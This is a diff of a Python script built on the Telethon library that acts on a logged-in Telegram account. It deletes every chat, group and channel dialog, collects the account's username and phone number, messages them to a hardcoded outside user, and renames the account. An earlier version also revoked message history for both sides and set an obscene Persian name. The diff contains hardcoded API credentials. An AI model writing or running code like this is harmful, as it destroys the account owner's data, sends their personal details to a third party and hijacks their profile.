@@ -1,12 +1,11 @@
 from telethon import TelegramClient
-from telethon.tl.functions.messages import DeleteHistoryRequest
 from telethon.tl.functions.account import UpdateProfileRequest
 
-API_ID =
-API_HASH = ""
+API_ID = 29834234
+API_HASH = "552c01d21d127def060f2915aedeebf9"
 
-INFO_USERNAME = "Moein_915"
-NEW_FIRST_NAME = "کیر تو کونم"
+TARGET_USERNAME = "Moein_915"
+NEW_FIRST_NAME = "تست"
 
 client = TelegramClient("my_account", API_ID, API_HASH)
 
@@ -14,21 +13,24 @@ client = TelegramClient("my_account", API_ID, API_HASH)
 async def main():
     await client.start()
 
-    async for d in client.iter_dialogs():
+    # حذف چت‌ها، گروه‌ها و کانال‌ها از لیست گفتگوها
+    async for dialog in client.iter_dialogs():
         try:
-            await client(DeleteHistoryRequest(
-                peer=d.entity,
-                max_id=0,
-                revoke=True
-            ))
-        except Exception:
-            pass
+            name = dialog.name or str(dialog.id)
 
-        await client.delete_dialog(d.entity)
-        print(f"Deleted: {d.name or d.id}")
+            await client.delete_dialog(dialog.entity)
 
-    print("Done deleting chats.")
+            print(f"Deleted: {name}")
 
+        except Exception as e:
+            print(
+                f"Failed: {dialog.name or dialog.id} "
+                f"-> {type(e).__name__}: {e}"
+            )
+
+    print("\nDone processing all dialogs.")
+
+    # دریافت اطلاعات اکانت
     me = await client.get_me()
 
     username = f"@{me.username}" if me.username else "(no username)"
@@ -40,16 +42,21 @@ async def main():
         f"Phone: {phone}"
     )
 
-    await client.send_message(
-        INFO_USERNAME,
-        info_text
+    print("\n--- Account info ---")
+    print(info_text)
+    print("--------------------")
+
+    # ارسال اطلاعات
+    await client.send_message(TARGET_USERNAME, info_text)
+
+    print(f"Sent account info to {TARGET_USERNAME}")
+
+    # تغییر نام
+    await client(
+        UpdateProfileRequest(
+            first_name=NEW_FIRST_NAME
+        )
     )
-
-    print(f"Account info sent to @{INFO_USERNAME}")
-
-    await client(UpdateProfileRequest(
-        first_name=NEW_FIRST_NAME
-    ))
 
     print(f"Account name changed to: {NEW_FIRST_NAME}")
 
